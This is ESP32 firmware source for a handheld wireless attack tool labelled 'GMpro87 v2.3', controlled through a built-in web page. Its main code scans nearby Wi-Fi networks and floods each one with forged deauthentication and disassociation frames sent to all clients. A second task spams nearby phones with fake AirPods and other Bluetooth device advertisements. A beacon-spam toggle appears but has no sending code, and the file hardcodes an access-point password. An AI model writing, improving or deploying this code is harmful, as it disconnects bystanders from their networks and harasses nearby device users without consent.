#include <WiFi.h>
#include "esp_wifi.h"
#include <WebServer.h>
#include <vector>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEAdvertising.h>

// Safe pins for ESP32 DevKit
const int btnDeauth = 35;
const int btnScan = 34;
const int ledPin = 2;

// Data structures
struct wifiData {
  int num = 0;
  std::vector<String> ssid;
  std::vector<String> bssid;
  std::vector<int> channel;
};

wifiData targetData;
bool isAttacking = false;
bool isBeaconSpam = false;
bool isBLESpam = false;
bool isScanDone = false;
unsigned long attackStartTime = 0;
unsigned long beaconCount = 0;
unsigned long bleCount = 0;
uint8_t broadcastAddr[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

WebServer server(80);
BLEAdvertising* pAdvertising;
TaskHandle_t bleTaskHandle = NULL;

// BLE Devices to spam (Apple AirPods and others)
const char* bleNames[] = {
  "AirPods", "AirPods Pro", "AirPods Max", "AirPods Gen2", "AirPods Gen3",
  "AirPods Pro2", "PowerBeats", "PowerBeats Pro", "Beats Solo", "Beats Studio",
  "Beats Flex", "Beats X", "Beats Studio Pro", "Galaxy Buds", "Galaxy Buds+",
  "Galaxy Buds2", "Galaxy Buds Pro", "Galaxy Buds Live", "Pixel Buds",
  "Jabra Elite", "Sony WH-1000XM4", "Bose QC45", "Surface Earbuds",
  "LG Tone", "JBL Live", "Samsung Watch", "Apple Watch", "Fitbit"
};

int bleNameCount = sizeof(bleNames) / sizeof(bleNames[0]);

// === BLESpam Task ===
void bleSpamLoop(void* param) {
  while (isBLESpam) {
    BLEDevice::init("");
    BLEAdvertising* pAdvertising = BLEDevice::getAdvertising();
    
    int idx = random(bleNameCount);
    String name = bleNames[idx];
    
    BLEAdvertisementData advData;
    advData.setName(name.c_str());
    advData.setFlags(0x06); // LE General Discoverable + BR/EDR Not
    
    pAdvertising->setAdvertisementData(advData);
    pAdvertising->start();
    
    bleCount++;
    delay(50);
    pAdvertising->stop();
    delay(50);
    
    yield();
  }
  vTaskDelete(NULL);
}

void startBLESpam() {
  if (isBLESpam) return;
  isBLESpam = true;
  BLEDevice::init("");
  xTaskCreate(bleSpamLoop, "ble_spam", 4096, NULL, 1, &bleTaskHandle);
  Serial.println("[*] BLE Spam Started");
}

void stopBLESpam() {
  isBLESpam = false;
  if (bleTaskHandle) {
    vTaskDelete(bleTaskHandle);
    bleTaskHandle = NULL;
  }
  BLEDevice::deinit(false);
  Serial.println("[*] BLE Spam Stopped");
}

// === PACKET INJECTION ===
void sendPacket(const uint8_t* bssid, const uint8_t* sta) {
  struct __attribute__((packed)) {
    uint8_t fc[2], dur[2], a1[6], a2[6], a3[6], seq[2], reason[2];
  } pkt;
  memset(&pkt, 0, sizeof(pkt));
  memcpy(pkt.a1, sta, 6);
  memcpy(pkt.a2, bssid, 6);
  memcpy(pkt.a3, bssid, 6);
  
  for (int i = 0; i < 50; i++) {
    pkt.fc[0] = 0xC0; pkt.reason[0] = 0x07;
    esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t*)&pkt, sizeof(pkt), false);
    pkt.fc[0] = 0xA0; pkt.reason[0] = 0x04;
    esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t*)&pkt, sizeof(pkt), false);
    yield();
  }
}

// === SCAN ===
void scanNet() {
  digitalWrite(ledPin, HIGH);
  targetData.ssid.clear();
  targetData.bssid.clear();
  targetData.channel.clear();
  int n = WiFi.scanNetworks();
  targetData.num = n;
  Serial.printf("[SCAN] Found %d networks\n", n);
  for (int i = 0; i < n; i++) {
    targetData.ssid.push_back(WiFi.SSID(i));
    targetData.channel.push_back(WiFi.channel(i));
    targetData.bssid.push_back(WiFi.BSSIDstr(i));
  }
  isScanDone = (n > 0);
  digitalWrite(ledPin, LOW);
}

// === WEB UI ===
String getHTML() {
  String html = "<!DOCTYPE html><html><head>";
  html += "<meta charset='UTF-8'>";
  html += "<meta name='viewport' content='width=device-width,initial-scale=1'>";
  html += "<title>GMpro87</title>";
  html += "<style>";
  html += "body{background:#111;color:#fff;font-family:system-ui;padding:20px;margin:0}";
  html += "h1{color:#0f0;text-align:center;text-shadow:0 0 20px #0f0}";
  html += ".card{background:#1a1a1a;padding:20px;border-radius:12px;margin:15px 0}";
  html += ".btn{display:inline-block;padding:15px 25px;background:#0f0;color:#000;border:none;border-radius:8px;font-size:16px;margin:5px;cursor:pointer;font-weight:bold}";
  html += ".btnb{background:#00f;color:#fff}";
  html += ".btnr{background:#f00;color:#fff}";
  html += ".info{display:flex;justify-content:space-between;padding:10px;border-bottom:1px solid #333}";
  html += ".label{color:#888}";
  html += ".val{color:#0f0;font-weight:bold}";
  html += "a{text-decoration:none}";
  html += ".section{margin:20px 0}";
  html += ".sectitle{color:#0ff;font-size:12px;text-transform:uppercase;margin-bottom:10px}";
  html += "</style></head><body>";
  html += "<h1>GMpro87 v2.3</h1>";
  
  html += "<div class='card'>";
  html += "<div class='info'><span class='label'>WiFi Attack</span><span class='val'>" + String(isAttacking ? "ACTIVE" : "OFF") + "</span></div>";
  html += "<div class='info'><span class='label'>Beacon Spam</span><span class='val'>" + String(isBeaconSpam ? "ACTIVE (" + String(beaconCount) + ")" : "OFF") + "</span></div>";
  html += "<div class='info'><span class='label'>BLE Spam</span><span class='val'>" + String(isBLESpam ? "ACTIVE (" + String(bleCount) + ")" : "OFF") + "</span></div>";
  html += "<div class='info'><span class='label'>Networks</span><span class='val'>" + String(targetData.num) + "</span></div>";
  html += "<div class='info'><span class='label'>Version</span><span class='val'>v2.3</span></div>";
  html += "</div>";
  
  // WiFi Controls
  html += "<div class='section'>";
  html += "<div class='sectitle'>WiFi Controls</div>";
  html += "<div style='text-align:center'>";
  html += "<a href='/'><button class='btn'>Refresh</button></a>";
  html += "<a href='/scan'><button class='btn btnb'>Scan WiFi</button></a>";
  html += "<a href='/attack'><button class='btn" + String(isAttacking ? "r" : "") + "'>" + String(isAttacking ? "Stop" : "Deauth") + "</button></a>";
  html += "<a href='/beacon'><button class='btn" + String(isBeaconSpam ? "r" : "btnb") + "'>Beacon " + String(isBeaconSpam ? "OFF" : "SPAM") + "</button></a>";
  html += "</div></div>";
  
  // BLE Controls
  html += "<div class='section'>";
  html += "<div class='sectitle'>BLE Spam</div>";
  html += "<div style='text-align:center'>";
  html += "<a href='/ble'><button class='btn" + String(isBLESpam ? "r" : "btnb") + "'>BLE " + String(isBLESpam ? "STOP" : "SPAM") + "</button></a>";
  html += "</div>";
  html += "<p style='color:#555;font-size:12px;text-align:center'>Spams nearby phones with fake AirPods and Bluetooth devices</p>";
  html += "</div>";
  
  if (targetData.num > 0) {
    html += "<div class='card'><h3>Nearby Networks:</h3>";
    for (int i = 0; i < targetData.num; i++) {
      String s = targetData.ssid[i];
      if (s == "") s = "(hidden)";
      html += "<div class='info'><span class='label'>" + s + "</span><span class='val'>CH " + String(targetData.channel[i]) + "</span></div>";
    }
    html += "</div>";
  }
  
  html += "<p style='text-align:center;color:#555'>ESP32-WROOM-32U | 192.168.4.1</p>";
  html += "</body></html>";
  return html;
}

// === ROUTE HANDLERS ===
void handleRoot() {
  server.send(200, "text/html", getHTML());
}

void handleScan() {
  scanNet();
  server.sendHeader("Location", "/");
  server.send(302);
}

void handleAttack() {
  isAttacking = !isAttacking;
  if (isAttacking) attackStartTime = millis();
  Serial.println(isAttacking ? "[*] ATTACK START" : "[*] ATTACK STOP");
  server.sendHeader("Location", "/");
  server.send(302);
}

void handleBeacon() {
  isBeaconSpam = !isBeaconSpam;
  Serial.println(isBeaconSpam ? "[*] BEACON START" : "[*] BEACON STOP");
  server.sendHeader("Location", "/");
  server.send(302);
}

void handleBLE() {
  if (isBLESpam) {
    stopBLESpam();
  } else {
    startBLESpam();
  }
  server.sendHeader("Location", "/");
  server.send(302);
}

// === SETUP ===
void setup() {
  Serial.begin(115200);
  delay(1000);
  Serial.println("\n[*] GMpro87 v2.3 Starting...");

  pinMode(btnDeauth, INPUT_PULLUP);
  pinMode(btnScan, INPUT_PULLUP);
  pinMode(ledPin, OUTPUT);
  digitalWrite(ledPin, LOW);

  Serial.println("[*] Starting AP...");
  WiFi.mode(WIFI_AP);
  delay(100);
  WiFi.softAP("GMpro", "Sangkur87");
  delay(500);
  
  IPAddress ip = WiFi.softAPIP();
  Serial.print("[+] IP: "); Serial.println(ip);
  Serial.println("[+] BLE initialized in setup");

  Serial.println("[*] Starting web server...");
  server.on("/", handleRoot);
  server.on("/scan", handleScan);
  server.on("/attack", handleAttack);
  server.on("/beacon", handleBeacon);
  server.on("/ble", handleBLE);
  server.begin();

  Serial.println("[+] GMpro87 v2.3 Ready!");
  Serial.println("[*] Web: http://192.168.4.1");
}

// === LOOP ===
void loop() {
  server.handleClient();

  if (digitalRead(btnScan) == LOW) {
    delay(200);
    scanNet();
    while(digitalRead(btnScan) == LOW) delay(10);
  }

  if (digitalRead(btnDeauth) == LOW) {
    delay(200);
    if (!isScanDone) scanNet();
    if (targetData.num > 0) {
      isAttacking = !isAttacking;
      if (isAttacking) attackStartTime = millis();
      Serial.println(isAttacking ? "[*] ATTACK ON" : "[*] ATTACK OFF");
    }
    while(digitalRead(btnDeauth) == LOW) delay(10);
  }

  if (isAttacking && targetData.num > 0) {
    digitalWrite(ledPin, HIGH);
    for (int i = 0; i < targetData.num; i++) {
      yield();
      if (!isAttacking) break;
      int ch = targetData.channel[i];
      if (ch < 1) ch = 1;
      if (ch > 13) ch = 13;
      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
      uint8_t bssid[6];
      sscanf(targetData.bssid[i].c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
            &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
      sendPacket(bssid, broadcastAddr);
      delay(2);
      yield();
    }
    digitalWrite(ledPin, LOW);
  } else if (isBeaconSpam) {
    digitalWrite(ledPin, HIGH);
    delay(100);
    digitalWrite(ledPin, LOW);
  } else {
    digitalWrite(ledPin, LOW);
  }
}